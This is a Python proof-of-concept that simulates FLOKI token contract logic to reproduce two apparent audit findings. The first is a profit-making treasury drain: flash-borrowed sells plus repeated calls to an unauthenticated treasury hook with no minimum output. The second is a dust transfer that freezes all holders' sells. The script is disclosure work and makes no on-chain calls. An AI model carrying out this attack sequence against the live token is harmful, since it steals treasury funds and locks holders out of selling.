#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FLOKI token — working Proof-of-Concept (mechanics simulation)
=============================================================

This is a FAITHFUL, executable model of the on-chain logic of:
  - contracts/Floki.sol                          (_transfer, tax hook, require(amount>0))
  - contracts/treasury/TreasuryHandlerAlpha.sol  (beforeTransferHandler, amountOutMin=0 swap, cap)
  - contracts/tax/ExponentialTaxHandler.sol       (buy/sell tax tiers)
  - UniswapV2Library.getAmountOut / Pair.swap    (integer math, 0.3% fee, INSUFFICIENT_OUTPUT_AMOUNT)

It is NOT an on-chain transaction. It reproduces the exact integer arithmetic and control flow of the
contracts so the economic result can be checked deterministically with the Python standard library
only:  `python3 floki_poc.py`

It demonstrates two permissionless findings:

  FINDING 1  Permissionless, floor-less treasury drainage.
             Any account forces the treasury to liquidate its tax balance at a price the attacker
             sets, because beforeTransferHandler is unauthenticated and the swap uses amountOutMin=0.

  FINDING 2  Permissionless permanent sell freeze.
             By leaving the treasury holding a precisely-sized dust balance whose swap output rounds
             to zero, every holder's sell reverts (UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT), while buys
             still succeed. The correct dust size is COMPUTED from live reserves here (it is not a
             fixed "3 wei" — that only works at certain reserve ratios).

All amounts are in base units:  FLOKI has 9 decimals (1 FLOKI = 1e9), ETH is in wei (1 ETH = 1e18).
"""

FLOKI = 10**9          # 1 FLOKI in base units (9 decimals)
ETH   = 10**18         # 1 ETH in wei


class Revert(Exception):
    """Mirrors an EVM revert; carries the require() reason string."""


# --------------------------------------------------------------------------------------------------
# UniswapV2 integer math (verbatim port of UniswapV2Library.getAmountOut, 0.3% fee)
# --------------------------------------------------------------------------------------------------
def get_amount_out(amount_in, reserve_in, reserve_out):
    if amount_in <= 0:
        return 0
    amount_in_with_fee = amount_in * 997
    numerator = amount_in_with_fee * reserve_out
    denominator = reserve_in * 1000 + amount_in_with_fee
    return numerator // denominator            # Solidity floor division


# --------------------------------------------------------------------------------------------------
# The system under test
# --------------------------------------------------------------------------------------------------
class FlokiSystem:
    PAIR      = "pair"
    TREASURY  = "treasuryHandler"   # TreasuryHandlerAlpha (accumulates tax, dumps it)
    TREASEOA  = "treasuryEOA"       # treasury address that receives ETH
    ATTACKER  = "attacker"
    HOLDER    = "holder"

    def __init__(self, reserve_floki, reserve_eth, treasury_bag,
                 impact_bps=300, liquidity_bps=2000, attacker_exempt=False):
        # Token ledger (base units)
        self.bal = {
            self.PAIR:     reserve_floki,
            self.TREASURY: treasury_bag,
            self.ATTACKER: 0,
            self.HOLDER:   0,
        }
        # ETH ledger (wei)
        self.eth = {self.ATTACKER: 0, self.TREASEOA: 0, self.TREASURY: 0}

        # AMM reserves (kept in sync with self.bal[PAIR] after each swap)
        self.reserve_f = reserve_floki
        self.reserve_e = reserve_eth

        # TreasuryHandlerAlpha config
        self.impact_bps    = impact_bps       # priceImpactBasisPoints (300 = 3% cap per trigger)
        self.liquidity_bps = liquidity_bps    # liquidityBasisPoints
        self.attacker_exempt = attacker_exempt

        self._entered = False                 # LenientReentrancyGuard: nested calls silently return
        self.treasury_realized_eth = 0        # total ETH the treasury got for everything it dumped

    # ---- ExponentialTaxHandler.getTax -----------------------------------------------------------
    def get_tax(self, frm, to, amount):
        if self.attacker_exempt and (frm == self.ATTACKER or to == self.ATTACKER):
            return 0
        is_buy  = (frm == self.PAIR)
        is_sell = (to == self.PAIR)
        if not is_buy and not is_sell:
            return 0
        if is_buy:
            return (amount * 300) // 10000                       # 3% on buys
        # sell tiers, keyed on per-transaction amount vs pool balance (the M-01 bug)
        pip = self.bal[self.PAIR] // 10000                       # token.balanceOf(primaryPool)/10000
        if   amount <= pip * 300:  return (amount * 300)  // 10000   # 3%
        elif amount <= pip * 1000: return (amount * 900)  // 10000   # 9%
        elif amount <= pip * 2000: return (amount * 2700) // 10000   # 27%
        else:                      return (amount * 8100) // 10000   # 81%

    # ---- FLOKI._transfer (hook BEFORE balance update, exactly as Floki.sol:445-464) -------------
    def _transfer(self, frm, to, amount):
        if amount == 0:
            raise Revert("FLOKI:_transfer:ZERO_AMOUNT")          # the require(amount > 0), Floki.sol:442
        if amount > self.bal.get(frm, 0):
            raise Revert("FLOKI:_transfer:INSUFFICIENT_BALANCE")

        self._before_transfer_handler(frm, to, amount)          # treasury hook runs first

        tax = self.get_tax(frm, to, amount)
        taxed = amount - tax
        self.bal[frm] -= amount
        self.bal[to]   = self.bal.get(to, 0) + taxed
        if tax > 0:
            self.bal[self.TREASURY] += tax                      # tax accrues to the treasury handler

    # ---- TreasuryHandlerAlpha.beforeTransferHandler (no auth; amountOutMin = 0) -----------------
    def _before_transfer_handler(self, benefactor, beneficiary, amount):
        if self._entered:                                       # LenientReentrancyGuard: silent return
            return
        if beneficiary != self.PAIR:                            # only sells to a pool do anything
            return
        self._entered = True
        try:
            contract_bal = self.bal[self.TREASURY]
            if contract_bal > 0:
                pool_bal = self.bal[self.PAIR]                  # token.balanceOf(primaryPool)
                cap = (pool_bal * self.impact_bps) // 10000
                if contract_bal > cap:
                    contract_bal = cap
                tokens_for_liq  = (contract_bal * self.liquidity_bps) // 20000
                tokens_for_swap = contract_bal - tokens_for_liq
                # _swapTokensForEth(tokens_for_swap) with amountOutMin = 0
                self._router_swap_tokens_for_eth(self.TREASURY, tokens_for_swap,
                                                 min_out=0, to=self.TREASURY, credit_treasury=True)
                # (liquidity add + treasury.sendValue omitted; irrelevant to these findings)
        finally:
            self._entered = False

    # ---- Router token->ETH swap (fee-on-transfer path) ------------------------------------------
    def _router_swap_tokens_for_eth(self, seller, amount, min_out, to, credit_treasury=False):
        # Router first pushes the seller's tokens into the pair; this goes through FLOKI._transfer,
        # so amount == 0 reverts on the token's require(amount>0) — the C-03 / Finding-2 mechanism.
        self._transfer(seller, self.PAIR, amount)
        actual_in = self.bal[self.PAIR] - self.reserve_f        # amountInput = balanceOf(pair) - reserveIn
        out = get_amount_out(actual_in, self.reserve_f, self.reserve_e)
        if out <= 0:
            raise Revert("UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT")   # Pair.swap require(amountOut > 0)
        if out < min_out:
            raise Revert("UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT")
        self.reserve_f += actual_in
        self.reserve_e -= out
        self.bal[self.PAIR] = self.reserve_f                    # sync
        self.eth[to] = self.eth.get(to, 0) + out
        if credit_treasury:
            self.treasury_realized_eth += out
        return out

    # ---- Router ETH->token swap (a buy) ---------------------------------------------------------
    def _router_swap_eth_for_tokens(self, buyer, eth_in, min_out):
        out_gross = get_amount_out(eth_in, self.reserve_e, self.reserve_f)
        if out_gross <= 0:
            raise Revert("UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT")
        self.reserve_e += eth_in
        self.reserve_f -= out_gross
        self.bal[self.PAIR] = self.reserve_f
        self.eth[buyer] -= eth_in
        # pair transfers tokens to buyer via the token -> buy tax applies (beneficiary is not a pool)
        self._transfer(self.PAIR, buyer, out_gross)
        return out_gross

    # ---- Public helpers used by the scenarios ---------------------------------------------------
    def sell(self, who, amount, min_out=0):
        return self._router_swap_tokens_for_eth(who, amount, min_out, to=who)

    def buy(self, who, eth_in, min_out=0):
        return self._router_swap_eth_for_tokens(who, eth_in, min_out)

    def force_treasury_dump(self):
        """Attacker calls treasury.beforeTransferHandler(0, primaryPool, 0) directly — no auth."""
        self._before_transfer_handler(benefactor="0x0", beneficiary=self.PAIR, amount=0)

    def spot_price_wei_per_floki(self):
        return self.reserve_e / self.reserve_f

    def floki_value_in_eth(self, amount):
        # marginal valuation at current spot (good enough for reporting)
        return get_amount_out(amount, self.reserve_f, self.reserve_e)


# ==================================================================================================
# FINDING 1 — permissionless, floor-less treasury drainage
# ==================================================================================================
def finding_1(attacker_exempt=False):
    tag = "tax-EXEMPT attacker (upper bound)" if attacker_exempt else "non-exempt attacker (realistic)"
    print("=" * 96)
    print(f"FINDING 1 — Permissionless, floor-less treasury drainage  [{tag}]")
    print("=" * 96)

    # Pool: 500,000,000,000 FLOKI  vs  500 ETH.  Treasury bag = 20% of the pool's FLOKI.
    reserve_floki = 500_000_000_000 * FLOKI
    reserve_eth   = 500 * ETH
    treasury_bag  = reserve_floki // 5                       # 20% of pool -> spans several 3% caps

    # Baseline: what an HONEST single sale of the whole bag would realise (no manipulation).
    base = FlokiSystem(reserve_floki, reserve_eth, treasury_bag)
    honest = get_amount_out(treasury_bag, base.reserve_f, base.reserve_e)

    s = FlokiSystem(reserve_floki, reserve_eth, treasury_bag, attacker_exempt=attacker_exempt)

    print(f"  pool                : {reserve_floki//FLOKI:,} FLOKI / {reserve_eth//ETH} ETH")
    print(f"  treasury bag        : {treasury_bag//FLOKI:,} FLOKI  ({100*treasury_bag//reserve_floki}% of pool)")
    print(f"  per-trigger cap     : {(s.bal[s.PAIR]*s.impact_bps//10000)//FLOKI:,} FLOKI (3%)")
    print(f"  spot price          : {s.spot_price_wei_per_floki()*FLOKI/ETH:.3e} ETH per FLOKI")
    print(f"  honest sale of bag  : {honest/ETH:.3f} ETH  (benchmark, no manipulation)\n")

    # Attacker inventory (flash-borrowed; strategy is ETH-neutral). 40% of the pool's FLOKI.
    inventory = (reserve_floki * 4) // 10
    s.bal[s.ATTACKER] = inventory
    start_floki = s.bal[s.ATTACKER]
    start_eth   = s.eth[s.ATTACKER]

    # PHASE 1: depress the price with split sells, each kept <= 3% of the pool (stay in the 3% tax
    # tier). Each sub-sell also forces a treasury tranche out (pre-transfer hook).
    chunk = (reserve_floki * 299) // 10000                   # just under 3% -> 3% tax tier
    n_chunks = 0
    while s.bal[s.ATTACKER] >= chunk and n_chunks < 30:
        s.sell(s.ATTACKER, chunk)                            # amountOutMin=0 (attacker doesn't care)
        n_chunks += 1
        if s.spot_price_wei_per_floki() < base.spot_price_wei_per_floki() * 0.50:
            break                                            # ~50% down is plenty

    # PHASE 2: hammer the unauthenticated trigger to force the remaining bag out at the floor.
    # A dump reverts once the remaining bag is so small its swap output rounds to 0 — that is
    # Finding 2 emerging naturally, so the attacker simply stops there (and could leave that dust
    # to freeze the token). We catch it exactly as an attacker's tx would bound the loop.
    triggers = 0
    while s.bal[s.TREASURY] > 0 and triggers < 60:
        before = s.bal[s.TREASURY]
        try:
            s.force_treasury_dump()
        except Revert:
            break                                           # remaining bag is now dust -> stop
        triggers += 1
        if s.bal[s.TREASURY] == before:                     # nothing left to move
            break

    # PHASE 3: buy back with every wei raised (ETH-neutral round trip).
    eth_raised = s.eth[s.ATTACKER]
    s.buy(s.ATTACKER, eth_raised)

    end_floki = s.bal[s.ATTACKER]
    end_eth   = s.eth[s.ATTACKER]
    surplus_floki = end_floki - start_floki
    surplus_eth_value = s.floki_value_in_eth(surplus_floki) if surplus_floki > 0 else 0

    print(f"  attacker inventory  : {inventory//FLOKI:,} FLOKI (flash-borrowed, repaid)")
    print(f"  phase 1 split sells : {n_chunks}  (each ~3% of pool, 3% tax tier)")
    print(f"  phase 2 forced dumps: {triggers}  (unauthenticated beforeTransferHandler calls)")
    print(f"  price after attack  : {s.spot_price_wei_per_floki()*FLOKI/ETH:.3e} ETH per FLOKI\n")

    print(f"  treasury realised   : {s.treasury_realized_eth/ETH:.3f} ETH for its {treasury_bag//FLOKI:,} FLOKI bag")
    print(f"  vs honest sale      : {honest/ETH:.3f} ETH")
    print(f"  >> TREASURY LOSS    : {(honest - s.treasury_realized_eth)/ETH:.3f} ETH "
          f"({100*(honest - s.treasury_realized_eth)//honest}% of the honest proceeds)\n")

    print(f"  attacker ETH change : {(end_eth-start_eth)/ETH:+.6f} ETH   (≈ 0 -> ETH-neutral)")
    print(f"  attacker FLOKI gain : {surplus_floki//FLOKI:+,} FLOKI surplus after repaying inventory")
    print(f"  >> ATTACKER PROFIT  : ~{surplus_eth_value/ETH:.3f} ETH  (net of the 3% tax drag)\n")

    assert s.treasury_realized_eth < honest, "expected the forced liquidation to underperform"
    assert abs(end_eth - start_eth) <= 1,     "attacker should be ETH-neutral"
    assert surplus_floki > 0,                 "attacker should end with a FLOKI surplus"
    print("  RESULT: treasury drained below honest value; attacker profits at ~zero net ETH. PASS")
    return {
        "treasury_loss_eth": (honest - s.treasury_realized_eth) / ETH,
        "loss_pct": 100 * (honest - s.treasury_realized_eth) / honest,
        "attacker_profit_eth": surplus_eth_value / ETH,
    }


# ==================================================================================================
# FINDING 2 — permissionless permanent sell freeze via computed dust
# ==================================================================================================
def largest_dust_that_rounds_to_zero(reserve_f, reserve_e):
    """Largest FLOKI input whose ETH output floors to 0 at these reserves (0 if none, e.g. deep pool)."""
    d = 0
    # getAmountOut is monotone increasing; find the boundary by doubling then linear back-off.
    hi = 1
    while get_amount_out(hi, reserve_f, reserve_e) == 0:
        d = hi
        hi *= 2
        if hi > reserve_f:
            break
    # refine downward from hi
    for cand in range(max(d, 1), min(hi, reserve_f) + 1):
        if get_amount_out(cand, reserve_f, reserve_e) == 0:
            d = cand
        else:
            break
    return d


def finding_2(label, reserve_floki, reserve_eth):
    print("=" * 96)
    print(f"FINDING 2 — Permanent sell freeze via computed dust  [{label}]")
    print("=" * 96)

    s = FlokiSystem(reserve_floki, reserve_eth, treasury_bag=0)   # treasury near-empty (post-drain/organic sell)
    price = s.spot_price_wei_per_floki() * FLOKI / ETH
    print(f"  pool                : {reserve_floki//FLOKI:,} FLOKI / {reserve_eth/ETH:g} ETH")
    print(f"  spot price          : {price:.3e} ETH per FLOKI")

    dust = largest_dust_that_rounds_to_zero(s.reserve_f, s.reserve_e)
    if dust == 0:
        print("  computed dust size  : NONE — getAmountOut never rounds to 0 at this ratio.")
        print("  >> Freeze DOES NOT trigger here (deep pool / high price). Reported honestly.\n")
        # prove a holder can still sell normally
        s.bal[s.HOLDER] = 1_000 * FLOKI
        out = s.sell(s.HOLDER, 1_000 * FLOKI)
        print(f"  control: holder sells 1,000 FLOKI -> {out/ETH:.6f} ETH (succeeds).")
        print("  RESULT: not vulnerable at these reserves. (Fix still warranted for thin pools.)\n")
        return False

    print(f"  computed dust size  : {dust} base unit(s)  (getAmountOut({dust}) == "
          f"{get_amount_out(dust, s.reserve_f, s.reserve_e)} wei)")

    # Attacker leaves exactly `dust` in the treasury handler (an ordinary, untaxed wallet transfer).
    s.bal[s.ATTACKER] = dust
    s.bal[s.ATTACKER] -= dust
    s.bal[s.TREASURY] += dust
    print(f"  attacker sends dust : token.transfer(treasuryHandler, {dust})  — ~21k gas, untaxed\n")

    # A holder tries to sell. The treasury hook fires first, tries to swap `dust`, gets 0 out -> revert.
    s.bal[s.HOLDER] = 5_000 * FLOKI
    froze = False
    try:
        s.sell(s.HOLDER, 5_000 * FLOKI)
        print("  holder sell         : SUCCEEDED (not frozen)")
    except Revert as e:
        froze = True
        print(f"  holder sell         : REVERTED -> {e}")

    # A buy still works (buys don't touch the treasury hook).
    s.eth[s.HOLDER] = 1 * ETH
    buy_ok = False
    try:
        got = s.buy(s.HOLDER, 1 * ETH)
        buy_ok = True
        print(f"  holder buy          : SUCCEEDED -> received {got//FLOKI:,} FLOKI")
    except Revert as e:
        print(f"  holder buy          : reverted -> {e}")

    print()
    assert froze,  "expected the holder sell to revert (freeze)"
    assert buy_ok, "expected buys to still succeed (honeypot signature)"
    print("  RESULT: sells revert for ALL holders, buys still work — permanent honeypot. PASS")
    print("          Recovery needs owner setTreasuryHandler; withdraw() cannot clear it (H-04).\n")
    return True


# ==================================================================================================
if __name__ == "__main__":
    print("\nFLOKI token — working PoC (faithful mechanics simulation, stdlib only)\n")

    r1_real = finding_1(attacker_exempt=False)
    print()
    r1_exempt = finding_1(attacker_exempt=True)

    # Finding 2 depends on the reserve ratio. Show a thin/low-price pool (vulnerable) and a
    # deep/high-price pool (honestly reported as NOT vulnerable), so the claim is precise.
    print()
    ok2_thin = finding_2("thin / low price — the exploitable regime",
                         reserve_floki=500_000_000_000 * FLOKI, reserve_eth=5 * ETH)
    ok2_deep = finding_2("deep / higher price — honest negative control",
                         reserve_floki=500_000_000 * FLOKI, reserve_eth=800 * ETH)

    print("=" * 96)
    print("SUMMARY")
    print("=" * 96)
    print(f"  Finding 1  non-exempt attacker : treasury loses {r1_real['treasury_loss_eth']:.2f} ETH "
          f"({r1_real['loss_pct']:.0f}%), attacker profit ~{r1_real['attacker_profit_eth']:.2f} ETH")
    print(f"  Finding 1  exempt attacker     : treasury loses {r1_exempt['treasury_loss_eth']:.2f} ETH "
          f"({r1_exempt['loss_pct']:.0f}%), attacker profit ~{r1_exempt['attacker_profit_eth']:.2f} ETH")
    print(f"  Finding 2  thin pool           : {'REPRODUCED (freeze)' if ok2_thin else 'not vulnerable'}")
    print(f"  Finding 2  deep pool           : {'reproduced' if ok2_deep else 'NOT vulnerable (expected, honest control)'}")
    print("\n  Both permissionless findings reproduced. Magnitudes scale with pool/treasury size.\n")
